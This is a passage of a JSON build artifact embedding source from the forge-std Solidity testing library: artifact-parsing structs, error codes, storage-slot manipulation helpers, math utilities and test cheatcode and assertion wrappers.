accessList;\n        bytes data;\n        address from;\n        bytes gas;\n        bytes nonce;\n        address to;\n        bytes txType;\n        bytes value;\n    }\n\n    struct Tx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        bytes32 hash;\n        Tx1559Detail txDetail;\n        string opcode;\n    }\n\n    struct Tx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 nonce;\n        address to;\n        uint256 txType;\n        uint256 value;\n    }\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that DO NOT conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n    struct TxLegacy{\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        string hash;\n        string opcode;\n        TxDetailLegacy transaction;\n    }\n\n    struct TxDetailLegacy{\n        AccessList[] accessList;\n        uint256 chainId;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 gasPrice;\n        bytes32 hash;\n        uint256 nonce;\n        bytes1 opcode;\n        bytes32 r;\n        bytes32 s;\n        uint256 txType;\n        address to;\n        uint8 v;\n        uint256 value;\n    }\n\n    struct AccessList{\n        address accessAddress;\n        bytes32[] storageKeys;\n    }\n\n    // Data structures to parse Receipt objects from the broadcast artifact.\n    // The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawReceipt {\n        bytes32 blockHash;\n        bytes blockNumber;\n        address contractAddress;\n        bytes cumulativeGasUsed;\n        bytes effectiveGasPrice;\n        address from;\n        bytes gasUsed;\n        RawReceiptLog[] logs;\n        bytes logsBloom;\n        bytes status;\n        address to;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n    }\n\n    struct Receipt {\n        bytes32 blockHash;\n        uint256 blockNumber;\n        address contractAddress;\n        uint256 cumulativeGasUsed;\n        uint256 effectiveGasPrice;\n        address from;\n        uint256 gasUsed;\n        ReceiptLog[] logs;\n        bytes logsBloom;\n        uint256 status;\n        address to;\n        bytes32 transactionHash;\n        uint256 transactionIndex;\n    }\n\n    // Data structures to parse the entire broadcast artifact, assuming the\n    // transactions conform to EIP1559.\n\n    struct EIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        Receipt[] receipts;\n        uint256 timestamp;\n        Tx1559[] transactions;\n        TxReturn[] txReturns;\n    }\n\n    struct RawEIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        RawReceipt[] receipts;\n        TxReturn[] txReturns;\n        uint256 timestamp;\n        RawTx1559[] transactions;\n    }\n\n    struct RawReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        bytes blockNumber;\n        bytes data;\n        bytes logIndex;\n        bool removed;\n        bytes32[] topics;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n        bytes transactionLogIndex;\n    }\n\n    struct ReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        uint256 blockNumber;\n        bytes data;\n        uint256 logIndex;\n        bytes32[] topics;\n        uint256 transactionIndex;\n        uint256 transactionLogIndex;\n        bool removed;\n    }\n\n    struct TxReturn {\n        string internalType;\n        string value;\n    }\n\n\n    function readEIP1559ScriptArtifact(string memory path)\n        internal\n        returns(EIP1559ScriptArtifact memory)\n    {\n        string memory data = vm.readFile(path);\n        bytes memory parsedData = vm.parseJson(data);\n        RawEIP1559ScriptArtifact memory rawArtifact = abi.decode(parsedData, (RawEIP1559ScriptArtifact));\n        EIP1559ScriptArtifact memory artifact;\n        artifact.libraries = rawArtifact.libraries;\n        artifact.path = rawArtifact.path;\n        artifact.timestamp = rawArtifact.timestamp;\n        artifact.pending = rawArtifact.pending;\n        artifact.txReturns = rawArtifact.txReturns;\n        artifact.receipts = rawToConvertedReceipts(rawArtifact.receipts);\n        artifact.transactions = rawToConvertedEIPTx1559s(rawArtifact.transactions);\n        return artifact;\n    }\n\n    function rawToConvertedEIPTx1559s(RawTx1559[] memory rawTxs)\n        internal pure\n        returns (Tx1559[] memory)\n    {\n        Tx1559[] memory txs = new Tx1559[](rawTxs.length);\n        for (uint i; i < rawTxs.length; i++) {\n            txs[i] = rawToConvertedEIPTx1559(rawTxs[i]);\n        }\n        return txs;\n    }\n\n    function rawToConvertedEIPTx1559(RawTx1559 memory rawTx)\n        internal pure\n        returns (Tx1559 memory)\n    {\n        Tx1559 memory transaction;\n        transaction.arguments = rawTx.arguments;\n        transaction.contractName = rawTx.contractName;\n        transaction.functionSig = rawTx.functionSig;\n        transaction.hash= rawTx.hash;\n        transaction.txDetail = rawToConvertedEIP1559Detail(rawTx.txDetail);\n        transaction.opcode= rawTx.opcode;\n        return transaction;\n    }\n\n    function rawToConvertedEIP1559Detail(RawTx1559Detail memory rawDetail)\n        internal pure\n        returns (Tx1559Detail memory)\n    {\n        Tx1559Detail memory txDetail;\n        txDetail.data = rawDetail.data;\n        txDetail.from = rawDetail.from;\n        txDetail.to = rawDetail.to;\n        txDetail.nonce = bytesToUint(rawDetail.nonce);\n        txDetail.txType = bytesToUint(rawDetail.txType);\n        txDetail.value = bytesToUint(rawDetail.value);\n        txDetail.gas = bytesToUint(rawDetail.gas);\n        txDetail.accessList = rawDetail.accessList;\n        return txDetail;\n\n    }\n\n    function readTx1559s(string memory path)\n        internal\n        returns (Tx1559[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, \".transactions\");\n        RawTx1559[] memory rawTxs = abi.decode(parsedDeployData, (RawTx1559[]));\n        return rawToConvertedEIPTx1559s(rawTxs);\n    }\n\n\n    function readTx1559(string memory path, uint256 index)\n        internal\n        returns (Tx1559 memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".transactions[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, key);\n        RawTx1559 memory rawTx = abi.decode(parsedDeployData, (RawTx1559));\n        return rawToConvertedEIPTx1559(rawTx);\n    }\n\n\n    // Analogous to readTransactions, but for receipts.\n    function readReceipts(string memory path)\n        internal\n        returns (Receipt[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData = vm.parseJson(deployData, \".receipts\");\n        RawReceipt[] memory rawReceipts = abi.decode(parsedDeployData, (RawReceipt[]));\n        return rawToConvertedReceipts(rawReceipts);\n    }\n\n    function readReceipt(string memory path, uint index)\n        internal\n        returns (Receipt memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".receipts[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData = vm.parseJson(deployData, key);\n        RawReceipt memory rawReceipt = abi.decode(parsedDeployData, (RawReceipt));\n        return rawToConvertedReceipt(rawReceipt);\n    }\n\n    function rawToConvertedReceipts(RawReceipt[] memory rawReceipts)\n        internal pure\n        returns(Receipt[] memory)\n    {\n        Receipt[] memory receipts = new Receipt[](rawReceipts.length);\n        for (uint i; i < rawReceipts.length; i++) {\n            receipts[i] = rawToConvertedReceipt(rawReceipts[i]);\n        }\n        return receipts;\n    }\n\n    function rawToConvertedReceipt(RawReceipt memory rawReceipt)\n        internal pure\n        returns(Receipt memory)\n    {\n        Receipt memory receipt;\n        receipt.blockHash = rawReceipt.blockHash;\n        receipt.to = rawReceipt.to;\n        receipt.from = rawReceipt.from;\n        receipt.contractAddress = rawReceipt.contractAddress;\n        receipt.effectiveGasPrice = bytesToUint(rawReceipt.effectiveGasPrice);\n        receipt.cumulativeGasUsed= bytesToUint(rawReceipt.cumulativeGasUsed);\n        receipt.gasUsed = bytesToUint(rawReceipt.gasUsed);\n        receipt.status = bytesToUint(rawReceipt.status);\n        receipt.transactionIndex = bytesToUint(rawReceipt.transactionIndex);\n        receipt.blockNumber = bytesToUint(rawReceipt.blockNumber);\n        receipt.logs = rawToConvertedReceiptLogs(rawReceipt.logs);\n        receipt.logsBloom = rawReceipt.logsBloom;\n        receipt.transactionHash = rawReceipt.transactionHash;\n        return receipt;\n    }\n\n    function rawToConvertedReceiptLogs(RawReceiptLog[] memory rawLogs)\n        internal pure\n        returns (ReceiptLog[] memory)\n    {\n        ReceiptLog[] memory logs = new ReceiptLog[](rawLogs.length);\n        for (uint i; i < rawLogs.length; i++) {\n            logs[i].logAddress = rawLogs[i].logAddress;\n            logs[i].blockHash = rawLogs[i].blockHash;\n            logs[i].blockNumber = bytesToUint(rawLogs[i].blockNumber);\n            logs[i].data = rawLogs[i].data;\n            logs[i].logIndex = bytesToUint(rawLogs[i].logIndex);\n            logs[i].topics = rawLogs[i].topics;\n            logs[i].transactionIndex = bytesToUint(rawLogs[i].transactionIndex);\n            logs[i].transactionLogIndex = bytesToUint(rawLogs[i].transactionLogIndex);\n            logs[i].removed = rawLogs[i].removed;\n        }\n        return logs;\n\n    }\n\n    function bytesToUint(bytes memory b) internal pure returns (uint256){\n            uint256 number;\n            for (uint i=0; i < b.length; i++) {\n                number = number + uint(uint8(b[i]))*(2**(8*(b.length-(i+1))));\n            }\n        return number;\n    }\n\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-ERRORS\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdError {\n    bytes public constant assertionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x01);\n    bytes public constant arithmeticError = abi.encodeWithSignature(\"Panic(uint256)\", 0x11);\n    bytes public constant divisionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x12);\n    bytes public constant enumConversionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x21);\n    bytes public constant encodeStorageError = abi.encodeWithSignature(\"Panic(uint256)\", 0x22);\n    bytes public constant popError = abi.encodeWithSignature(\"Panic(uint256)\", 0x31);\n    bytes public constant indexOOBError = abi.encodeWithSignature(\"Panic(uint256)\", 0x32);\n    bytes public constant memOverflowError = abi.encodeWithSignature(\"Panic(uint256)\", 0x41);\n    bytes public constant zeroVarError = abi.encodeWithSignature(\"Panic(uint256)\", 0x51);\n    // DEPRECATED: Use Vm's `expectRevert` without any arguments instead\n    bytes public constant lowLevelError = bytes(\"\"); // `0x`\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-STORAGE\n//////////////////////////////////////////////////////////////////////////*/\n\nstruct StdStorage {\n    mapping (address => mapping(bytes4 => mapping(bytes32 => uint256))) slots;\n    mapping (address => mapping(bytes4 =>  mapping(bytes32 => bool))) finds;\n\n    bytes32[] _keys;\n    bytes4 _sig;\n    uint256 _depth;\n    address _target;\n    bytes32 _set;\n}\n\nlibrary stdStorage {\n    event SlotFound(address who, bytes4 fsig, bytes32 keysHash, uint slot);\n    event WARNING_UninitedSlot(address who, uint slot);\n\n    uint256 private constant UINT256_MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    int256 private constant INT256_MAX = 57896044618658097711785492504343953926634992332820282019728792003956564819967;\n\n    Vm private constant vm_std_store = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));\n\n    function sigs(\n        string memory sigStr\n    )\n        internal\n        pure\n        returns (bytes4)\n    {\n        return bytes4(keccak256(bytes(sigStr)));\n    }\n\n    /// @notice find an arbitrary storage slot given a function sig, input data, address of the contract and a value to check against\n    // slot complexity:\n    //  if flat, will be bytes32(uint256(uint));\n    //  if map, will be keccak256(abi.encode(key, uint(slot)));\n    //  if deep map, will be keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))));\n    //  if map struct, will be bytes32(uint256(keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))))) + structFieldDepth);\n    function find(\n        StdStorage storage self\n    )\n        internal\n        returns (uint256)\n    {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        // calldata to test against\n        if (self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n        }\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        vm_std_store.record();\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n\n        (bytes32[] memory reads, ) = vm_std_store.accesses(address(who));\n        if (reads.length == 1) {\n            bytes32 curr = vm_std_store.load(who, reads[0]);\n            if (curr == bytes32(0)) {\n                emit WARNING_UninitedSlot(who, uint256(reads[0]));\n            }\n            if (fdat != curr) {\n                require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n            }\n            emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[0]));\n            self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[0]);\n            self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n        } else if (reads.length > 1) {\n            for (uint256 i = 0; i < reads.length; i++) {\n                bytes32 prev = vm_std_store.load(who, reads[i]);\n                if (prev == bytes32(0)) {\n                    emit WARNING_UninitedSlot(who, uint256(reads[i]));\n                }\n                // store\n                vm_std_store.store(who, reads[i], bytes32(hex\"1337\"));\n                bool success;\n                bytes memory rdat;\n                {\n                    (success, rdat) = who.staticcall(cald);\n                    fdat = bytesToBytes32(rdat, 32*field_depth);\n                }\n\n                if (success && fdat == bytes32(hex\"1337\")) {\n                    // we found which of the slots is the actual one\n                    emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[i]));\n                    self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[i]);\n                    self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n                    vm_std_store.store(who, reads[i], prev);\n                    break;\n                }\n                vm_std_store.store(who, reads[i], prev);\n            }\n        } else {\n            require(false, \"stdStorage find(StdStorage): No storage use detected for target.\");\n        }\n\n        require(self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))], \"stdStorage find(StdStorage): Slot(s) not found.\");\n\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n\n        return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n    }\n\n    function target(StdStorage storage self, address _target) internal returns (StdStorage storage) {\n        self._target = _target;\n        return self;\n    }\n\n    function sig(StdStorage storage self, bytes4 _sig) internal returns (StdStorage storage) {\n        self._sig = _sig;\n        return self;\n    }\n\n    function sig(StdStorage storage self, string memory _sig) internal returns (StdStorage storage) {\n        self._sig = sigs(_sig);\n        return self;\n    }\n\n    function with_key(StdStorage storage self, address who) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(uint256(uint160(who))));\n        return self;\n    }\n\n    function with_key(StdStorage storage self, uint256 amt) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(amt));\n        return self;\n    }\n    function with_key(StdStorage storage self, bytes32 key) internal returns (StdStorage storage) {\n        self._keys.push(key);\n        return self;\n    }\n\n    function depth(StdStorage storage self, uint256 _depth) internal returns (StdStorage storage) {\n        self._depth = _depth;\n        return self;\n    }\n\n    function checked_write(StdStorage storage self, address who) internal {\n        checked_write(self, bytes32(uint256(uint160(who))));\n    }\n\n    function checked_write(StdStorage storage self, uint256 amt) internal {\n        checked_write(self, bytes32(amt));\n    }\n\n    function checked_write(StdStorage storage self, bool write) internal {\n        bytes32 t;\n        /// @solidity memory-safe-assembly\n        assembly {\n            t := write\n        }\n        checked_write(self, t);\n    }\n\n    function checked_write(\n        StdStorage storage self,\n        bytes32 set\n    ) internal {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        if (!self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            find(self);\n        }\n        bytes32 slot = bytes32(self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]);\n\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n        bytes32 curr = vm_std_store.load(who, slot);\n\n        if (fdat != curr) {\n            require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n        }\n        vm_std_store.store(who, slot, set);\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n    }\n\n    function read(StdStorage storage self) private returns (bytes memory) {\n        address t = self._target;\n        uint256 s = find(self);\n        return abi.encode(vm_std_store.load(t, bytes32(s)));\n    }\n\n    function read_bytes32(StdStorage storage self) internal returns (bytes32) {\n        return abi.decode(read(self), (bytes32));\n    }\n\n\n    function read_bool(StdStorage storage self) internal returns (bool) {\n        int256 v = read_int(self);\n        if (v == 0) return false;\n        if (v == 1) return true;\n        revert(\"stdStorage read_bool(StdStorage): Cannot decode. Make sure you are reading a bool.\");\n    }\n\n    function read_address(StdStorage storage self) internal returns (address) {\n        return abi.decode(read(self), (address));\n    }\n\n    function read_uint(StdStorage storage self) internal returns (uint256) {\n        return abi.decode(read(self), (uint256));\n    }\n\n    function read_int(StdStorage storage self) internal returns (int256) {\n        return abi.decode(read(self), (int256));\n    }\n\n    function bytesToBytes32(bytes memory b, uint offset) public pure returns (bytes32) {\n        bytes32 out;\n\n        uint256 max = b.length > 32 ? 32 : b.length;\n        for (uint i = 0; i < max; i++) {\n            out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);\n        }\n        return out;\n    }\n\n    function flatten(bytes32[] memory b) private pure returns (bytes memory)\n    {\n        bytes memory result = new bytes(b.length * 32);\n        for (uint256 i = 0; i < b.length; i++) {\n            bytes32 k = b[i];\n            /// @solidity memory-safe-assembly\n            assembly {\n                mstore(add(result, add(32, mul(32, i))), k)\n            }\n        }\n\n        return result;\n    }\n\n\n\n}\n\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-MATH\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdMath {\n    int256 private constant INT256_MIN = -57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    function abs(int256 a) internal pure returns (uint256) {\n        // Required or it will fail when `a = type(int256).min`\n        if (a == INT256_MIN)\n            return 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n        return uint256(a > 0 ? a : -a);\n    }\n\n    function delta(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b\n            ? a - b\n            : b - a;\n    }\n\n    function delta(int256 a, int256 b) internal pure returns (uint256) {\n        // a and b are of the same sign\n        // this works thanks to two's complement, the left-most bit is the sign bit\n        if ((a ^ b) > -1) {\n            return delta(abs(a), abs(b));\n        }\n\n        // a and b are of opposite signs\n        return abs(a) + abs(b);\n    }\n\n    function percentDelta(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n\n        return absDelta * 1e18 / b;\n    }\n\n    function percentDelta(int256 a, int256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n        uint256 absB = abs(b);\n\n        return absDelta * 1e18 / absB;\n    }\n}\n","sourceMap":"36758:1306:21:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;36758:1306:21;;;;;;;;;;;;;;;;;","sourceMapDeployed":"36758:1306:21:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"stdStorage","artifactPath":"out/Test.sol/stdStorage.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdStorage","sourceFileId":21,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\npragma experimental ABIEncoderV2;\n\nimport \"./Script.sol\";\nimport \"ds-test/test.sol\";\n\n// Wrappers around Cheatcodes to avoid footguns\nabstract contract Test is DSTest, Script {\n    using stdStorage for StdStorage;\n\n    uint256 internal constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    StdStorage internal stdstore;\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-LOGS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    event log_array(uint256[] val);\n    event log_array(int256[] val);\n    event log_array(address[] val);\n    event log_named_array(string key, uint256[] val);\n    event log_named_array(string key, int256[] val);\n    event log_named_array(string key, address[] val);\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-CHEATS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    // Skip forward or rewind time by the specified number of seconds\n    function skip(uint256 time) internal {\n        vm.warp(block.timestamp + time);\n    }\n\n    function rewind(uint256 time) internal {\n        vm.warp(block.timestamp - time);\n    }\n\n    // Setup a prank from an address that has some ether\n    function hoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who);\n    }\n\n    function hoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who);\n    }\n\n    function hoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who, origin);\n    }\n\n    function hoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who, origin);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    function startHoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who);\n    }\n\n    function startHoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    // tx.origin is set to the origin parameter\n    function startHoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who, origin);\n    }\n\n    function startHoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who, origin);\n    }\n\n    function changePrank(address who) internal {\n        vm.stopPrank();\n        vm.startPrank(who);\n    }\n\n    // creates a labeled address and the corresponding private key\n    function makeAddrAndKey(string memory name) internal returns(address addr, uint256 privateKey) {\n        privateKey = uint256(keccak256(abi.encodePacked(name)));\n        addr = vm.addr(privateKey);\n        vm.label(addr, name);\n    }\n\n    // creates a labeled address\n    function makeAddr(string memory name) internal returns(address addr) {\n        (addr,) = makeAddrAndKey(name);\n    }\n\n    // DEPRECATED: Use `deal` instead\n    function tip(address token, address to, uint256 give) internal {\n        emit log_named_string(\"WARNING\", \"Test tip(address,address,uint256): The `tip` stdcheat has been deprecated. Use `deal` instead.\");\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n    }\n\n    // The same as Vm's `deal`\n    // Use the alternative signature for ERC20 tokens\n    function deal(address to, uint256 give) internal {\n        vm.deal(to, give);\n    }\n\n    // Set the balance of an account for any ERC20 token\n    // Use the alternative signature to update `totalSupply`\n    function deal(address token, address to, uint256 give) internal {\n        deal(token, to, give, false);\n    }\n\n    function deal(address token, address to, uint256 give, bool adjust) internal {\n        // get current balance\n        (, bytes memory balData) = token.call(abi.encodeWithSelector(0x70a08231, to));\n        uint256 prevBal = abi.decode(balData, (uint256));\n\n        // update balance\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n\n        // update total supply\n        if(adjust){\n            (, bytes memory totSupData) = token.call(abi.encodeWithSelector(0x18160ddd));\n            uint256 totSup = abi.decode(totSupData, (uint256));\n            if(give < prevBal) {\n                totSup -= (prevBal - give);\n            } else {\n                totSup += (give - prevBal);\n            }\n            stdstore\n                .target(token)\n                .sig(0x18160ddd)\n                .checked_write(totSup);\n        }\n    }\n\n    function bound(uint256 x, uint256 min, uint256 max) internal virtual returns (uint256 result) {\n        require(min <= max, \"Test bound(uint256,uint256,uint256): Max is less than min.\");\n\n        uint256 size = max - min;\n\n        if (size == 0)\n        {\n            result = min;\n        }\n        else if (size == UINT256_MAX)\n        {\n            result = x;\n        }\n        else\n        {\n            ++size; // make `max` inclusive\n            uint256 mod = x % size;\n            result = min + mod;\n        }\n\n        emit log_named_uint(\"Bound Result\", result);\n    }\n\n    // Deploy a contract by fetching the contract bytecode from\n    // the artifacts directory\n    // e.g. `deployCode(code, abi.encode(arg1,arg2,arg3))`\n    function deployCode(string memory what, bytes memory args)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string): Deployment failed.\"\n        );\n    }\n\n    /// deploy contract with value on construction\n    function deployCode(string memory what, bytes memory args, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes,uint256): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,uint256): Deployment failed.\"\n        );\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-ASSERTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function fail(string memory err) internal virtual {\n        emit log_named_string(\"Error\", err);\n        fail();\n    }\n\n    function assertFalse(bool data) internal virtual {\n        assertTrue(!data);\n    }\n\n    function assertFalse(bool data, string memory err) internal virtual {\n        assertTrue(!data, err);\n    }\n\n    function assertEq(bool a, bool b) internal {\n        if (a != b) {\n            emit log                (\"Error: a == b not satisfied [bool]\");\n            emit log_named_string   (\"  Expected\", b ? \"true\" : \"false\");\n            emit log_named_string   (\"    Actual\", a ? \"true\" : \"false\");\n            fail();\n        }\n    }\n\n    function assertEq(bool a, bool b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes memory a, bytes memory b) internal {\n        assertEq0(a, b);\n    }\n\n    function assertEq(bytes memory a, bytes memory b, string memory err) internal {\n        assertEq0(a, b, err);\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [uint[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [int[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(address[] memory a, address[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [address[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n\n    function assertEq(address[] memory a, address[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEqUint(uint256 a, uint256 b) internal {\n        assertEq(uint256(a), uint256(b));\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint (\"  Expected\", b);\n            emit log_named_uint (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int  (\"  Expected\", b);\n            emit log_named_int  (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    